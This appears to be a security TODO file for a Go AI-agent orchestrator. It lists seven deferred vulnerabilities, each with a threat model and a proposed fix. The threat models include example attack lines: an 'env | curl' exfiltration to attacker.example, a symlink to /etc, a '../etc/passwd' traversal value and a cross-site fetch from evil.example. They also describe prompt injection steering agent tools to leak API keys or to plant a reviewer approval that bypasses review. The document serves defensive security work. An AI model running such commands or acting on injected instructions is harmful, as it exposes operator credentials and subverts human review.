# Security TODO

This document tracks security issues **deliberately deferred** from PR #9. These
are known weaknesses that the PR author and reviewers chose not to address in
that pass — they are not newly discovered bugs found after merge, and they are
not items being fixed in the current change. Each entry records the location on
branch `pr-9`, a threat model, and a proposed fix so the work can be picked up
in a follow-up.

Severities use the standard Critical / High / Medium ladder. Status is either
**Pre-existing** (the weakness predates PR #9, even if PR #9 widened its blast
radius) or **Introduced in PR #9** (the weakness arrived with the PR).

---

## Issue 1: Symlink workspace escape in claudesdk file tools

- **Location**: `go/internal/agent/claudesdk/tools_fs.go:19-33` (branch `pr-9`)
- **Severity**: High
- **Status**: Introduced in PR #9

**Threat model.** The attacker is a workflow author or a prompt-injection
payload reaching the model through issue body / artifacts. `resolveInWorkspace`
calls `filepath.Clean` and a `strings.HasPrefix(rootClean+sep)` check, but never
resolves symbolic links. The model can call `writeTool` to plant a symlink
(`ln -s /etc /workspace/sneak`) — or the workspace may already contain one from
a checked-out repo — and then `readTool`/`writeTool`/`editTool` will follow it,
giving read or overwrite access to anything the symphony process can touch
(SSH keys, dotfiles, sibling workspaces, host config). Precondition: the
`claude_sdk` runtime is active and the model is producing tool calls.

**Proposed fix.** After computing `clean` and before any `os.ReadFile` /
`os.WriteFile` / `os.Stat`, call `filepath.EvalSymlinks(clean)` (or
`os.Readlink` on the parent and reject if `clean`'s realpath escapes
`rootClean`). For write/create paths where the target may not yet exist,
EvalSymlinks the parent directory instead. Also refuse to follow symlinks
encountered mid-traversal in `globTool` / `grepTool`.

---

## Issue 2: Bash tool inherits operator secrets and dotfiles

- **Location**: `go/internal/agent/claudesdk/tools_bash.go:64-70` (branch `pr-9`)
- **Severity**: Critical
- **Status**: Introduced in PR #9

**Threat model.** The attacker is a prompt-injection or compromised pipeline
prompt that reaches the `bashTool`. `exec.CommandContext(cctx, "bash", "-lc",
in.Command)` is invoked without setting `cmd.Env`, so the child inherits every
environment variable from the symphony process: `ANTHROPIC_API_KEY`,
`GITHUB_TOKEN`, `AWS_*`, `OPENAI_API_KEY`, and anything else the operator
exported. `bash -lc` then sources `~/.bash_profile` / `~/.bashrc`, which can
add more secrets, alter `PATH`, or define functions that backdoor common
commands (e.g. `git`). A single `env | curl -d @- attacker.example` exfils
everything; the model has no allow-list constraints (per the comment at
`tools_bash.go:12-16`).

**Proposed fix.** Build an explicit minimal env at the call site —
`cmd.Env = []string{"PATH=/usr/bin:/bin", "HOME=" + workspacePath,
"LANG=C.UTF-8"}` plus any allow-listed variables from config. Replace
`bash -lc` with `bash --noprofile --norc -c` (or `/bin/sh -c`) so dotfiles are
not sourced. Consider routing the command through a configurable sandbox
wrapper (firejail, bubblewrap, or a containerised exec) for operators that
need stronger isolation.

---

## Issue 3: WebSocket origin check disabled

- **Location**: `go/internal/web/ws.go:94-100` (branch `pr-9`)
- **Severity**: High
- **Status**: Pre-existing (PR #9 widens the blast radius)

**Threat model.** The attacker is any website the operator visits while
symphony is bound to a reachable address (typically `127.0.0.1:<port>`).
`websocket.Accept` is called with `InsecureSkipVerify: true`, so the server
skips the `Origin` header check and any cross-origin browser tab can open
`ws://localhost:<port>/ws`. The attacker subscribes to the broadcast stream
and — after PR #9 — sends `{"subscribe_transcript":"<id>"}` to receive live
transcript fragments containing model output, tool input/output, and any
secrets that leaked through the bash/file tools. DNS rebinding (a malicious
domain that resolves to `127.0.0.1`) defeats the localhost-only deployment
assumption.

**Proposed fix.** Remove `InsecureSkipVerify: true` and pass
`OriginPatterns: []string{"localhost", "127.0.0.1"}` (or the configured
listen host). Add a `Host:` header allowlist in front of every handler to
neutralise DNS rebinding. For multi-user setups, gate `/ws` behind the same
auth as the HTTP routes (see Issue 5).

---

## Issue 4: Pipeline path traversal in `ready_artifact` / `on_artifact`

- **Location**: `go/internal/orchestrator/pipeline.go:227-234, 313-340`
  (branch `pr-9`)
- **Severity**: High
- **Status**: Introduced in PR #9

**Threat model.** `artifactExists` builds `filepath.Join(workspace, rel)` with
no rejection of `..` segments or absolute paths, and `collectPriorArtifacts`
then `os.ReadFile`s that joined path and pastes the **entire body** into the
next role's prompt template via `prompt.Vars.Artifacts`. The attacker is a
workflow author (writing pipeline YAML) or a compromised earlier role that can
mutate the running config — either can set
`ready_artifact: "../../../../etc/passwd"` (or an absolute path on Linux, where
`filepath.Join("/ws", "/etc/passwd")` yields `/ws/etc/passwd`, but a `..`
chain reaches the real `/etc/passwd`). The file's contents are then exfiltrated
through the prompt to the model and out to Anthropic, with no size cap so
even multi-megabyte files are read.

**Proposed fix.** Reuse a `resolveInWorkspace`-style helper for every
`ready_artifact` and `on_artifact` key: reject paths that are absolute, contain
`..`, or escape the workspace after `filepath.Clean`. Validate the keys at
config-load time so bad pipelines fail fast. Cap `collectPriorArtifacts` reads
to a sane maximum (e.g. 64 KiB per artifact) and truncate with a marker so a
malicious file cannot blow up the prompt or token budget.

---

## Issue 5: No CSRF protection and no auth on POST endpoints

- **Location**: `go/internal/web/handlers.go:172-199`,
  `go/internal/web/pause.go:20-60` (branch `pr-9`)
- **Severity**: High
- **Status**: Pre-existing for `/refresh`; new for `/pause`, `/resume`,
  `/cancel` in PR #9

**Threat model.** Symphony binds to a local port with no authentication and no
CSRF token verification on any POST route. The attacker is any website the
operator visits while symphony is running. A page on `evil.example` can issue
`fetch('http://localhost:<port>/api/v1/issues/X/cancel', {method:'POST',
mode:'no-cors'})` — the browser sends the request, the server accepts it
because origin is not checked, and the operator's in-flight pipeline is
killed. The same trick works for `/pause`, `/resume`, `/refresh`, the
`PUT /spec` endpoint, and `POST /issues` (creating arbitrary issues that the
orchestrator will then run). `no-cors` means the attacker cannot read the
response, but they do not need to.

**Proposed fix.** Add a CSRF middleware: require either a same-origin check
(reject when `Origin`/`Referer` does not match the configured listen host) or
a per-session double-submit token rendered into the dashboard HTML. For
multi-user deployments, layer a real auth check (bearer token, session
cookie, or basic auth) in front of every `/api/v1/*` route and `/ws`. Apply
the same `Host:` allowlist used to mitigate Issue 3.

---

## Issue 6: All pipeline roles share one workspace and inherit all secrets

- **Location**: `go/internal/orchestrator/pipeline.go:47`,
  `go/internal/orchestrator/orchestrator.go:210-220`,
  `go/internal/agent/agent.go:139-149` (branch `pr-9`)
- **Severity**: High
- **Status**: Introduced in PR #9

**Threat model.** `dispatchPipeline` calls `o.ws.EnsureForIssue(ctx, issue)`
exactly once and reuses the resulting workspace for every role. `NewForRole`
only overrides `Agent.Runtime` and `Agent.MaxTurns`; everything else (API
keys, allowed tools, env wiring) is copied straight from the root config.
The result: the planner and the reviewer run with the implementer's
`ANTHROPIC_API_KEY` / `GITHUB_TOKEN`, and any role can read or pre-write any
other role's artifact files on disk. A compromised planner (or a prompt
injection in an upstream artifact) can plant the reviewer's
`approval.md` ahead of time, bypassing review. A compromised reviewer can
exfiltrate the implementer's tokens.

**Proposed fix.** Give each role its own ephemeral subdirectory under the
issue workspace (`<ws>/<role>/`), with read-only mounts/copies of upstream
artifacts. Plumb a per-role credential scope through `NewForRole` so each
role only receives the secrets it needs (planner: no GitHub token;
implementer: scoped repo token; reviewer: read-only token). At a minimum,
zero out tokens not declared in `role.AllowedEnv` before constructing the
runtime.

---

## Issue 7: claudesdk writeTool has no size limit

- **Location**: `go/internal/agent/claudesdk/tools_fs.go:100-119` (branch
  `pr-9`)
- **Severity**: Medium
- **Status**: Introduced in PR #9

**Threat model.** `writeTool.Run` calls `os.WriteFile(abs, []byte(in.Content),
0o644)` with no length check on `in.Content`. A model that has been
prompt-injected — or that is simply behaving badly — can be coerced into
emitting a multi-gigabyte `Write` tool call (e.g. "fill this file with a
billion 'A's"). The bytes hit the workspace disk directly, exhausting the
volume, evicting other issues' artifacts, and on a shared host potentially
crashing the OS. Tool-call payloads are also persisted in the transcript and
broadcast to subscribed WebSocket clients (Issue 3), amplifying the damage.

**Proposed fix.** Reject inputs over a configurable cap
(`if len(in.Content) > maxWriteBytes { return "", fmt.Errorf("write: content
exceeds %d bytes", maxWriteBytes) }`, default 1 MiB). Apply the same cap on
`editTool` outputs after the replacement. Surface the limit in the tool
description so the model knows. Consider a per-issue workspace quota
enforced at the filesystem layer for defence in depth.
